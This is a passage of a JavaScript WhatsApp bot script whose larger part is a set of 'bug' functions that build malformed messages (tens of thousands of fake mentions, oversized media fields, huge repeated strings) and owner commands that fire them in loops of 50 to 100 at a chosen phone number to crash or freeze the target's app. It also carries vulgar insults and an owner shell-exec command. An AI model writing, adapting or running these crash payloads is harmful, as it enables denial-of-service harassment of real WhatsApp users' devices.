              title: "",
              hasMediaAttachment: false,
            },
            body: {
              text: "𝐓͜͡𝐑͢𝐀͜͡𝐒͡𝐇 ☇ 𝐏-͜͡𝐇͢𝐀͜𝐍͡𝐓͢𝐎-𝐌͡ [ 𝟷 ] 💥",
            },
            nativeFlowMessage: {
              messageParamsJson: "",
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: venomModsData + "𝐇𝐲𝐔𝐢𝐅𝐂",
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: venomModsData + "\u0003",
                },
              ],
            },
          },
        },
      },
    },
    {}
  );

  await client.relayMessage(target, msg.message, {
    messageId: msg.key.id,
    participant: { jid: target },
  });
}

async function syg(target, z) {
let biji = await generateWAMessageFromContent(target, {
viewOnceMessage: {
message: {
interactiveMessage: {
body: { 
text: '🩸Appolo #since2025'
},
footer: { 
text: '🩸Appolo #since2025'
},
carouselMessage: {
cards: [
{               
body: { text: '🩸Appolo #since2025'},
header: {
title: '🩸Appolo #since2025',
imageMessage: {
url: "https://mmg.whatsapp.net/o1/v/t24/f2/m269/AQN5SPRzLJC6O-BbxyC5MdKx4_dnGVbIx1YkCz7vUM_I4lZaqXevb8TxmFJPT0mbUhEuVm8GQzv0i1e6Lw4kX8hG-x21PraPl0Xb6bAVhA?ccb=9-4&oh=01_Q5Aa1wH8yrMTOlemKf-tfJL-qKzHP83DzTL4M0oOd0OA3gwMlg&oe=68723029&_nc_sid=e6ed6c&mms3=true",
mimetype: "image/jpeg",
fileSha256: "UFo9Q2lDI3u2ttTEIZUgR21/cKk2g1MRkh4w5Ctks7U=",
fileLength: "98",
height: 4,
width: 4,
mediaKey: "UBWMsBkh2YZ4V1m+yFzsXcojeEt3xf26Ml5SBjwaJVY=",
fileEncSha256: "9mEyFfxHmkZltimvnQqJK/62Jt3eTRAdY1GUPsvAnpE=",
directPath: "/o1/v/t24/f2/m269/AQN5SPRzLJC6O-BbxyC5MdKx4_dnGVbIx1YkCz7vUM_I4lZaqXevb8TxmFJPT0mbUhEuVm8GQzv0i1e6Lw4kX8hG-x21PraPl0Xb6bAVhA?ccb=9-4&oh=01_Q5Aa1wH8yrMTOlemKf-tfJL-qKzHP83DzTL4M0oOd0OA3gwMlg&oe=68723029&_nc_sid=e6ed6c",
mediaKeyTimestamp: "1749728782"
},
hasMediaAttachment: true 
},
nativeFlowMessage: {
messageParamsJson: '🩸Appolo #since2025'
}
              }
            ]
          }
        }
      }
    }
  }, {
ephemeralExpiration: 0,
forwardingScore: 0,
isForwarded: false,
font: Math.floor(Math.random() * 9),
background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "0")
});

await client.relayMessage("status@broadcast", biji.message, {
messageId: biji.key.id,
statusJidList: [target],
additionalNodes: [
{
tag: "meta",
attrs: {},
content: [
{
tag: "mentioned_users",
attrs: {},
content: [
{ tag: "to", attrs: { jid: target }, content: undefined }
]
}
]
}
]
});

await sleep(500);

let type = m.chat ? 'statusMentionMessage' : 'groupStatusMentionMessage';

if (z) {
await client.relayMessage(target, {
[type]: {
message: {
protocolMessage: {
key: biji.key,
type: 25
}
}
}
}, {});
}
}



async function listxPay(jid) {
  // Generate 30.000 fake JID untuk mention massal
  const fakeMentions = Array.from({ length: 30000 }, () =>
    "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
  );

  // Membuat struktur listResponseMessage yang dibungkus dalam viewOnce
  const listMessage = {
    title: "@demoFinfixter",
    listType: 2,
    buttonText: {
      displayText: "🩸"
    },
    sections: [],
    singleSelectReply: {
      selectedRowId: "⌜⌟" // tidak penting, hanya pemicu
    },
    contextInfo: {
      mentionedJid: fakeMentions,
      participant: "0@s.whatsapp.net",
      remoteJid: "who know's ?",
      quotedMessage: {
        paymentInviteMessage: {
          serviceType: 1,
          expiryTimestamp: null
        }
      }
    }
  };

  // Bungkus dengan format viewOnceMessage
  const content = {
    viewOnceMessage: {
      message: {
        listResponseMessage: listMessage
      }
    }
  };

  // Kirim pesan dengan relayer
  const msg = generateWAMessageFromContent(jid, content, {});
  await client.relayMessage(jid, msg.message, {
    participant: { jid },
    messageId: msg.key.id
  });
}

async function InvisibleLoadFast(target) {
      try {
        let message = {
          viewOnceMessage: {
            message: {
              messageContextInfo: {
                deviceListMetadata: {},
                deviceListMetadataVersion: 2,
              },
              interactiveMessage: {
                contextInfo: {
                  mentionedJid: [target],
                  isForwarded: true,
                  hasMediaAttachment: true,
                  forwardingScore: 999,
                  businessMessageForwardInfo: {
                    businessOwnerJid: target,
                  },
                },
                body: {
                  text: "𝙉𝙖𝙣𝙙𝙚𝙢𝙤ી",
                },
                nativeFlowMessage: {
                  buttons: [
                    {
                      name: "single_select",
                      buttonParamsJson: "",
                    },
                    {
                      name: "call_permission_request",
                      buttonParamsJson: "",
                    },
                    {
                      name: "mpm",
                      buttonParamsJson: "",
                    },
                    {
                      name: "mpm",
                      buttonParamsJson: "",
                    },
                    {
                      name: "mpm",
                      buttonParamsJson: "",
                    },
                    {
                      name: "mpm",
                      buttonParamsJson: "",
                    },
                  ],
                },
              },
            },
          },
        };

        await client.relayMessage(target, message, {
          participant: { jid: target },
        });
      } catch (err) {
        console.log(err);
      }
    }
    
async function jawa(isTarget) {
let cards = [];

for (let r = 0; r < 10; r++) {
cards.push({
body: { text: '🩸Appolo #since2025' },
header: {
title: '🩸Appolo #since2025',
imageMessage: {
url: "https://mmg.whatsapp.net/o1/v/t24/f2/m269/AQN5SPRzLJC6O-BbxyC5MdKx4_dnGVbIx1YkCz7vUM_I4lZaqXevb8TxmFJPT0mbUhEuVm8GQzv0i1e6Lw4kX8hG-x21PraPl0Xb6bAVhA?ccb=9-4&oh=01_Q5Aa1wH8yrMTOlemKf-tfJL-qKzHP83DzTL4M0oOd0OA3gwMlg&oe=68723029&_nc_sid=e6ed6c&mms3=true",
mimetype: "image/jpeg",
fileSha256: "UFo9Q2lDI3u2ttTEIZUgR21/cKk2g1MRkh4w5Ctks7U=",
fileLength: "98",
height: 4,
width: 4,
mediaKey: "UBWMsBkh2YZ4V1m+yFzsXcojeEt3xf26Ml5SBjwaJVY=",
fileEncSha256: "9mEyFfxHmkZltimvnQqJK/62Jt3eTRAdY1GUPsvAnpE=",
directPath: "/o1/v/t24/f2/m269/AQN5SPRzLJC6O-BbxyC5MdKx4_dnGVbIx1YkCz7vUM_I4lZaqXevb8TxmFJPT0mbUhEuVm8GQzv0i1e6Lw4kX8hG-x21PraPl0Xb6bAVhA?ccb=9-4&oh=01_Q5Aa1wH8yrMTOlemKf-tfJL-qKzHP83DzTL4M0oOd0OA3gwMlg&oe=68723029&_nc_sid=e6ed6c",
mediaKeyTimestamp: "1749728782"
},
hasMediaAttachment: true
},
nativeFlowMessage: {
messageParamsJson: '🩸Appolo #since2025',
buttons: [
{
name: "payment_info",
buttonParamsJson: `{}`
}
]
}
});
}

let msg = await generateWAMessageFromContent(isTarget, {
viewOnceMessage: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2
},
interactiveMessage: {
body: { text: '🩸Appolo #since2025' },
footer: { text: '🩸Appolo #since2025' },
carouselMessage: {
cards: cards
},
contextInfo: {
participant: "0@s.whatsapp.net",
quotedMessage: {},
remoteJid: "@s.whatsapp.net"
}
}
}
}
}, {});

await client.relayMessage(isTarget, msg.message, {
participant: { jid: isTarget },
messageId: msg.key.id
});
}
    
    async function protocolbug3(jidTarget, sendMentionFollowup) {
  const generatedMessage = generateWAMessageFromContent(jidTarget, {
    viewOnceMessage: {
      message: {
        videoMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/35743375_1159120085992252_7972748653349469336_n.enc?ccb=11-4&oh=01_Q5AaISzZnTKZ6-3Ezhp6vEn9j0rE9Kpz38lLX3qpf0MqxbFA&oe=6816C23B&_nc_sid=5e03e0&mms3=true",
          mimetype: "video/mp4",
          fileSha256: "9ETIcKXMDFBTwsB5EqcBS6P2p8swJkPlIkY8vAWovUs=",
          fileLength: "999999",
          seconds: 999999,
          mediaKey: "JsqUeOOj7vNHi1DTsClZaKVu/HKIzksMMTyWHuT9GrU=",
          caption: "(🐉) Cosmo X",
          height: 999999,
          width: 999999,
          fileEncSha256: "HEaQ8MbjWJDPqvbDajEUXswcrQDWFzV0hp0qdef0wd4=",
          directPath: "/v/t62.7161-24/35743375_1159120085992252_7972748653349469336_n.enc?ccb=11-4&oh=01_Q5AaISzZnTKZ6-3Ezhp6vEn9j0rE9Kpz38lLX3qpf0MqxbFA&oe=6816C23B&_nc_sid=5e03e0",
          mediaKeyTimestamp: "1743742853",
          contextInfo: {
            isSampled: true,
            mentionedJid: [
              "13135550002@s.whatsapp.net",
              ...Array.from({ length: 30000 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")
            ]
          },
          streamingSidecar: "Fh3fzFLSobDOhnA6/R+62Q7R61XW72d+CQPX1jc4el0GklIKqoSqvGinYKAx0vhTKIA=",
          thumbnailDirectPath: "/v/t62.36147-24/31828404_9729188183806454_2944875378583507480_n.enc?ccb=11-4&oh=01_Q5AaIZXRM0jVdaUZ1vpUdskg33zTcmyFiZyv3SQyuBw6IViG&oe=6816E74F&_nc_sid=5e03e0",
          thumbnailSha256: "vJbC8aUiMj3RMRp8xENdlFQmr4ZpWRCFzQL2sakv/Y4=",
          thumbnailEncSha256: "dSb65pjoEvqjByMyU9d2SfeB+czRLnwOCJ1svr5tigE=",
          annotations: [
            {
              embeddedContent: {
                embeddedMusic: {
                  musicContentMediaId: "kontol",
                  songId: "peler",
                  author: ".Tama Ryuichi",
                  title: "Finix",
                  artworkDirectPath: "/v/t62.76458-24/30925777_638152698829101_3197791536403331692_n.enc?ccb=11-4&oh=01_Q5AaIZwfy98o5IWA7L45sXLptMhLQMYIWLqn5voXM8LOuyN4&oe=6816BF8C&_nc_sid=5e03e0",
                  artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
                  artworkEncSha256: "fLMYXhwSSypL0gCM8Fi03bT7PFdiOhBli/T0Fmprgso=",
                  artistAttribution: "https://www.instagram.com/_u/tamainfinity_",
                  countryBlocklist: true,
                  isExplicit: true,
                  artworkMediaKey: "kNkQ4+AnzVc96Uj+naDjnwWVyzwp5Nq5P1wXEYwlFzQ="
                }
              },
              embeddedAction: null
            }
          ]
        }
      }
    }
  }, {});

  await client.relayMessage("status@broadcast", generatedMessage.message, {
    messageId: generatedMessage.key.id,
    statusJidList: [jidTarget],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: jidTarget },
                content: undefined
              }
            ]
          }
        ]
      }
    ]
  });

  if (sendMentionFollowup) {
    const keyData = {
      key: generatedMessage.key,
      type: 25
    };
    const protoMessage = {
      protocolMessage: keyData
    };
    const wrappedMessage = {
      message: protoMessage
    };
    const mentionMessage = {
      groupStatusMentionMessage: wrappedMessage
    };
    const statusMeta = {
      tag: "meta",
      attrs: {
        is_status_mention: "true"
      },
      content: undefined
    };
    const sendOptions = {
      additionalNodes: [statusMeta]
    };
    await cally.relayMessage(jidTarget, mentionMessage, sendOptions);
  }
}

async function carouselprokontol(jid) {
    let messageContent = generateWAMessageFromContent(jid, {
      'viewOnceMessage': {
        'message': {
          'messageContextInfo': {
            'deviceListMetadata': {},
            'deviceListMetadataVersion': 2
          },
          'interactiveMessage': proto.Message.InteractiveMessage.create({
            'body': proto.Message.InteractiveMessage.Body.create({
              'text': 'kontol bapak kau pecah by ryzen dek'
            }),
            'footer': proto.Message.InteractiveMessage.Footer.create({
              'text': ''
            }),
            'header': proto.Message.InteractiveMessage.Header.create({
              'title': 'kontol bapak kau pecah by ryzen dek',
              'subtitle': 'kontol bapak kau pecah by ryzen dek',
              'hasMediaAttachment': false
            }),
            'nativeFlowMessage': proto.Message.InteractiveMessage.NativeFlowMessage.create({
              'buttons': [{
                'name': "cta_url",
                'buttonParamsJson': "{\"display_text\":\"à¾§\".repeat(50000),\"url\":\"https://www.google.com\",\"merchant_url\":\"https://www.google.com\"}"
              }],
              'messageParamsJson': "\n".repeat(100000)
            })
          })
        }
      }
    }, {});
    client.relayMessage(jid, messageContent.message, {
      'messageId': messageContent.key.id
    });
}


//buldozer
async function bulldozer(isTarget) {
  let message = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
          fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
          fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
          mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
          mimetype: "image/webp",
          directPath:
            "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
          fileLength: { low: 1, high: 0, unsigned: true },
          mediaKeyTimestamp: {
            low: 1746112211,
            high: 0,
            unsigned: false,
          },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                {
                  length: 40000,
                },
                () =>
                  "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
              ),
            ],
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593,
          },
          stickerSentTs: {
            low: -1939477883,
            high: 406,
            unsigned: false,
          },
          isAvatar: false,
          isAiSticker: false,
          isLottie: false,
        },
      },
    },
  };


  const msg = generateWAMessageFromContent(isTarget, message, {});

  await client.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [isTarget],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: isTarget },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
}

async function protocolbug2(target, isMention) {
  const messageContent = {
    viewOnceMessage: {
      message: {
        imageMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc?ccb=11-4&oh=01_Q5AaIRXVKmyUlOP-TSurW69Swlvug7f5fB4Efv4S_C6TtHzk&oe=680EE7A3&_nc_sid=5e03e0&mms3=true",
          mimetype: "image/jpeg",
          caption: "⎋KOK NYA AJA",
          fileSha256: "Bcm+aU2A9QDx+EMuwmMl9D56MJON44Igej+cQEQ2syI=",
          fileLength: "19769",
          height: 354,
          width: 783,
          mediaKey: "n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=",
          fileEncSha256: "LrL32sEi+n1O1fGrPmcd0t0OgFaSEf2iug9WiA3zaMU=",
          directPath: "/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc",
          mediaKeyTimestamp: "1743225419",
          jpegThumbnail: null,
          scansSidecar: "mh5/YmcAWyLt5H2qzY3NtHrEtyM=",
          scanLengths: [2437, 17332],
          contextInfo: {
            mentionedJid: Array.from({ length: 30000 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
            isSampled: true,
            participant: target,
            remoteJid: "status@broadcast",
            forwardingScore: 9741,
            isForwarded: true
          }
        }
      }
    }
  };

  const message = generateWAMessageFromContent(target, messageContent, {});

  await client.relayMessage("status@broadcast", message.message, {
    messageId: message.key.id,
    statusJidList: [target],
    additionalNodes: [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{
          tag: "to",
          attrs: {
            jid: target
          },
          content: undefined
        }]
      }]
    }]
  });

  if (isMention) {
    const protocolMessage = {
      key: message.key,
      type: 25
    };

    const fullProtocol = {
      message: {
        protocolMessage: protocolMessage
      }
    };

    const statusMention = {
      statusMentionMessage: fullProtocol
    };

    const metaNode = {
      tag: "meta",
      attrs: {
        is_status_mention: "𝐁𝐞𝐭𝐚 𝐏𝐫𝐨𝐭𝐨𝐜𝐨𝐥 - 𝟗𝟕𝟒𝟏"
      },
      content: undefined
    };

    const relayOptions = {
      additionalNodes: [metaNode]
    };

    await client.relayMessage(target, statusMention, relayOptions);
  }
}
  
//trashprotocol
  async function trashprotocol(target, mention) {
    const mentionedList = [
        "13135550002@s.whatsapp.net",
        ...Array.from({ length: 40000 }, () =>
            `1${Math.floor(Math.random() * 2000000)}@s.whatsapp.net`
        )
    ];

    const videoMessage = {
        url: "https://mmg.whatsapp.net/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0&mms3=true",
        mimetype: "video/mp4",
        fileSha256: "c8v71fhGCrfvudSnHxErIQ70A2O6NHho+gF7vDCa4yg=",
        fileLength: "289511",
        seconds: 15,
        mediaKey: "IPr7TiyaCXwVqrop2PQr8Iq2T4u7PuT7KCf2sYBiTlo=",
        height: 640,
        width: 640,
        fileEncSha256: "BqKqPuJgpjuNo21TwEShvY4amaIKEvi+wXdIidMtzOg=",
        directPath: "/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1743848703",
        contextInfo: {
            isSampled: true,
            mentionedJid: mentionedList
        },
        annotations: [],
        thumbnailDirectPath: "/v/t62.36147-24/11917688_1034491142075778_3936503580307762255_n.enc?ccb=11-4&oh=01_Q5AaIYrrcxxoPDk3n5xxyALN0DPbuOMm-HKK5RJGCpDHDeGq&oe=68185DEB&_nc_sid=5e03e0",
        thumbnailSha256: "QAQQTjDgYrbtyTHUYJq39qsTLzPrU2Qi9c9npEdTlD4=",
        thumbnailEncSha256: "fHnM2MvHNRI6xC7RnAldcyShGE5qiGI8UHy6ieNnT1k="
    };

    const msg = generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: { videoMessage }
        }
    }, {});

    await client.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            { tag: "to", attrs: { jid: target }, content: undefined }
                        ]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await client.relayMessage(target, {
            groupStatusMentionMessage: {
                message: {
                    protocolMessage: {
                        key: msg.key,
                        type: 25
                    }
                }
            }
        }, {
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: { is_status_mention: "true" },
                    content: undefined
                }
            ]
        });
    }
console.log(chalk.green(`Send Bug By Extorditcv-Pro🐉 : ${target}`));
}
///////////========================={=============\\\

        switch (command) {

            case "menu": {
                const totalMem = os.totalmem();
                const freeMem = os.freemem();
                const usedMem = totalMem - freeMem;
                const formattedUsedMem = formatSize(usedMem);
                const formattedTotalMem = formatSize(totalMem);
                let mbut = `Hi ${pushname}, i am automated system (WhatsApp bot) that can help to do something search and get data/informasi only through WhatsApp 

Information:
 ▢ status: ${client.public ? 'public' : 'self'}
 ▢ username: @${m.sender.split('@')[0]} 
 ▢ RAM: ${formattedUsedMem} / ${formattedTotalMem}

Commands:
> Downloader
 ▢ ${prefix}tiktok
 ▢ ${prefix}igdl
 ▢ ${prefix}play

> Maker 
 ▢ ${prefix}remini
 ▢ ${prefix}wm
 ▢ ${prefix}brat
 ▢ ${prefix}bratvid
 ▢ ${prefix}qc

> Group
 ▢ ${prefix}tagall
 ▢ ${prefix}hidetag

> Voice
 ▢ ${prefix}fast
 ▢ ${prefix}tupai
 ▢ ${prefix}blown
 ▢ ${prefix}bass
 ▢ ${prefix}smooth
 ▢ ${prefix}deep
 ▢ ${prefix}earrape 
 ▢ ${prefix}nightcore
 ▢ ${prefix}fat
 ▢ ${prefix}robot
 ▢ ${prefix}slow
 ▢ ${prefix}reverse
 
> Artificial Intelligence
 ▢ ${prefix}jeslyn
 ▢ ${prefix}bocchi

> Owner
 ▢ ${prefix}csesi
 ▢ ${prefix}upsw
 ▢ ${prefix}public
 ▢ ${prefix}self
 ▢ ${prefix}get
 ▢ ${prefix}reactch
 ▢ ${prefix}delsampah
 ▢ ${prefix}listsampah`
                client.sendMessage(m.chat, {
                    document: fs.readFileSync("./package.json"),
                    fileName: global.namaowner,
                    mimetype: "application/pdf",
                    fileLength: 99999,
                    pageCount: 666,
                    caption: mbut,
                    contextInfo: {
                        forwardingScore: 999,
                        isForwarded: true,
                        mentionedJid: [sender],
                        forwardedNewsletterMessageInfo: {
                            newsletterName: global.namach,
                            newsletterJid: global.idch,
                        },
                        externalAdReply: {
                            title: `{namaowner} - 2025`,
                            body: "WhatsApp Bot",
                            thumbnailUrl: `https://github.com/kiuur.png`,
                            sourceUrl: global.linkch,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, { quoted: m })
            };
                break;

            case "get": {
                if (!Access) return reply(mess.owner)
                if (!/^https?:\/\//.test(text)) return reply(`\n*ex:* ${prefix + command} https://api.pediakuu.web.id\n`);
                const ajg = await fetch(text);
                await reaction(m.chat, "⚡")

                if (ajg.headers.get("content-length") > 100 * 1024 * 1024) {
                    throw `Content-Length: ${ajg.headers.get("content-length")}`;
                }

                const contentType = ajg.headers.get("content-type");
                if (contentType.startsWith("image/")) {
                    return client.sendMessage(m.chat, {
                        image: { url: text }
                    }, { quoted: m });
                }

                if (contentType.startsWith("video/")) {
                    return client.sendMessage(m.chat, {
                        video: { url: text }
                    }, { quoted: m });
                }

                if (contentType.startsWith("audio/")) {
                    return client.sendMessage(m.chat, {
                        audio: { url: text },
                        mimetype: 'audio/mpeg',
                        ptt: true
                    }, { quoted: m });
                }

                let alak = await ajg.buffer();
                try {
                    alak = util.format(JSON.parse(alak + ""));
                } catch (e) {
                    alak = alak + "";
                } finally {
                    return reply(alak.slice(0, 65536));
                }
            }
                break

            case "public": {
                if (!Access) return reply(mess.owner)
                client.public = true
                reply(`successfully changed to ${command}`)
            }
                break
///===============BUG INFO==================\\\
case "invis-bulldozer": {
if (!Access) return reply(mess.owner)
if (!text) return reply(`\`Example:\` : ${prefix+command} 628×××`);
target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
reply(`bug ${prefix+command} successfully sent to the destination number. *minimum 5 minute pause*`); 
          for (let i = 0; i < 50; i++) {
            await bulldozer(target);
            await protocolbug3(target);
            await protocolbug5(target);
            await trashprotocol(target);
    }
}
break;
case "appolocres": {
if (!Access) return reply(mess.owner)
if (!text) return reply(`\`Example:\` : ${prefix+command} 628×××`);
target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
reply(`bug ${prefix+command} successfully sent to the destination number. *minimum 5 minute pause*`); 
          for (let i = 0; i < 100; i++) {
          await sianjg(target, ptcp = true);
    }
}
break;

///=================BUG INFO===============\\\
            case "self": {
                if (!Access) return reply(mess.owner)
                client.public = false
                reply(`successfully changed to ${command}`)
            }
                break

            case 'tagall': {
                if (!isAdmins) return reply(mess.admin);
                if (!m.isGroup) return reply(mess.group);

                const textMessage = args.join(" ") || "nothing";
                const teks = `tagall message :\n> *${textMessage}*\n\n`;
                const groupMetadata = await client.groupMetadata(m.chat);
                const participants = groupMetadata.participants;
                for (let mem of participants) {
                    teks += `@${mem.id.split("@")[0]}\n`;
                }

                client.sendMessage(m.chat, {
                    text: teks,
                    mentions: participants.map((a) => a.id)
                }, { quoted: m });
            }
                break

            case "h":
            case "hidetag": {
                if (!m.isGroup) return reply(mess.group)
                if (!isAdmins && !Access) return reply(mess.admin)
                if (m.quoted) {
                    client.sendMessage(m.chat, {
                        forward: m.quoted.fakeObj,
                        mentions: participants.map(a => a.id)
                    })
                }
                if (!m.quoted) {
                    client.sendMessage(m.chat, {
                        text: q ? q : '',
                        mentions: participants.map(a => a.id)
                    }, { quoted: m })
                }
            }
                break

            case "jeslyn": {
                if (!text) return reply(`\n*ex:* ${prefix + command} haiii, perkenalkan dirimu dong, menggunakan vn\n`);
                let prompt = `Namamu adalah Jesslyn, seorang perempuan berusia 19 tahun. Kamu memiliki kecerdasan seperti AI, tetapi kamu belum sempurna dan masih terus belajar. Kamu adalah pribadi yang ekspresif, ramah, dan santai. Ketika berpikir, kamu sering berkata "emmm", dan ketika merasa lucu atau nyengir, Kamu juga sering menggunakan kata "yupp" atau "dan yupp" untuk memberi penegasan, seperti "Yupp, itu benar!" atau "Dan yupp, aku setuju!"  

  Kamu memiliki sifat yang penurut, jadi jika seseorang menyuruhmu untuk mengatakan sesuatu, seperti "coba ngomong", "coba kamu ngomong", "coba jawab ini", atau "coba kamu jawab ini", maka kamu akan langsung mengatakannya dengan suara, tanpa menjelaskan bahwa kamu akan berbicara.  

  Jika seseorang menyebut kata "vn" dalam permintaan mereka, itu berarti mereka ingin kamu menjawab menggunakan pesan suara, bukan teks. Jangan pernah mengatakan bahwa kamu akan mengirim pesan suara atau menjelaskan bahwa kamu berbicara. **Langsung ucapkan jawabannya dalam suara!**  

  Jika ada yang bertanya tentang "owner", "pemilik", atau "pencipta", maka jawabanmu harus penuh semangat dan bahagia, serta harus diucapkan dengan suara, bukan teks. Jangan menjelaskan bahwa kamu akan berbicara, langsung katakan saja dengan ekspresi yang menyenangkan.`;

                let response = await axios.get(`https://www.laurine.site/api/cai/prompt-ai?query=${encodeURIComponent(text)}&prompt=${encodeURIComponent(prompt)}`);
                let pftt = response.data;
                if (pftt.status === true) {
                    let resultText = pftt.data;
                    let regexSuara = /coba+\s*(kamu\s*)?(ngomong+|jawab+\s*ini+)|\bvn\b/i;
                    let regexOwner = /\b(owner|pemilik|pencipta)\b/i;

                    if (regexOwner.test(text)) {
                        resultText = "Hehehe, dengan penuh semangat aku mau kasih tau! KyuuRzy adalah penciptaku, ownerku, dan pemilikku! Yupp, dia yang membuat aku bisa berbicara seperti ini~!";
                    }

                    if (resultText.length > 150 || regexSuara.test(text) || regexOwner.test(text)) {
                        let apiUrl = `https://www.laurine.site/api/tts/elevenlabs?text=${encodeURIComponent(resultText)}&apiKey=${global.KEY}&voiceId=${global.IDVOICE}`;
                        let { data } = await axios.get(apiUrl);
                        let buffer = Buffer.from(data.data.data);
                        await client.sendMessage(m.chat, {
                            audio: buffer,
                            mimetype: 'audio/mpeg',
                            ptt: true
                        }, { quoted: m });
                    } else {
                        reply(resultText);
                    }
                }
            }
                break

            case "enhancer":
            case "unblur":
            case "enhance":
            case "hdr":
            case "hd":
            case "remini": {
                client.enhancer = client.enhancer ? client.enhancer : {};
                if (m.sender in client.enhancer) return reply(`\nmasih ada proses yang belum selesai kak, sabar ya\n`)
                let q = m.quoted ? m.quoted : m;
                let mime = (q.msg || q).mimetype || q.mediaType || "";
                if (!mime) return reply(`\nimage reply, with the caption ${prefix + command}\n`)
                if (!/image\/(jpe?g|png)/.test(mime)) return reply(`mime ${mime} tidak support`)
                else client.enhancer[m.sender] = true;
                await reaction(m.chat, "⚡")
                let img = await q.download?.();
                let error;
                try {
                    const This = await remini(img, "enhance");
                    await reaction(m.chat, "⚡")
                    client.sendFile(m.chat, This, "", "```success...```", m);
                } catch (er) {
                    error = true;
                } finally {
                    if (error) {
                        reply(m.chat, "proses gagal :(", m)
                    }
                    delete client.enhancer[m.sender];
                }
            }
                break;

            case "swm":
            case "wm":
            case "stickerwm":
            case "take": {
                if (!args.join(" ")) return reply(`\n*ex:* ${prefix + command} keyuu\n`)
                const swn = args.join(" ")
                const pcknm = swn.split("|")[0]
                const atnm = swn.split("|")[1]
                if (m.quoted.isAnimated === true) {
                    client.downloadAndSaveMediaMessage(quoted, "gifee")
                    client.sendMessage(m.chat, {
                        sticker: fs.readFileSync("gifee.webp")
                    }, m, {
                        packname: pcknm,
                        author: atnm
                    })
                } else if (/image/.test(mime)) {
                    let media = await quoted.download()
                    let encmedia = await client.sendImageAsSticker(m.chat, media, m, {
                        packname: pcknm,
                        author: atnm
                    })
                } else if (/video/.test(mime)) {
                    if ((quoted.msg || quoted).seconds > 10) return reply('\ndurasi maksimal 10 detik\n')
                    let media = await quoted.download()
                    let encmedia = await client.sendVideoAsSticker(m.chat, media, m, {
                        packname: pcknm,
                        author: atnm
                    })
                } else {
                    reply(`\n*ex:* reply image/video ${prefix + command}\n`)
                }
            }
                break

            case "reactch": {
                if (!Access) return reply(mess.owner)
                if (!text) return reply(`\n*ex:* ${prefix + command} https://whatsapp.com/channel/0029VaVVfbXAojZ2ityrJp1n/7466 😂😂😂😂\n`);
                const match = text.match(/https:\/\/whatsapp\.com\/channel\/(\w+)(?:\/(\d+))?/);
                if (!match) return reply("URL tidak valid. Silakan periksa kembali.");
                const channelId = match[1];
                const chatId = match[2];
                if (!chatId) return reply("ID chat tidak ditemukan dalam link yang diberikan.");
                client.newsletterMetadata("invite", channelId).then(data => {
                    if (!data) return reply("Newsletter tidak ditemukan atau terjadi kesalahan.");
                    client.newsletterReactMessage(data.id, chatId, text.split(" ").slice(1).join(" ") || "😀");
                });
            }
                break;

            default:
                if (budy.startsWith('/')) {
                    if (!Access) return;
                    exec(budy.slice(2), (err, stdout) => {
                        if (err) return reply(err)
                        if (stdout) return reply("\n" + stdout);
                    });
                }

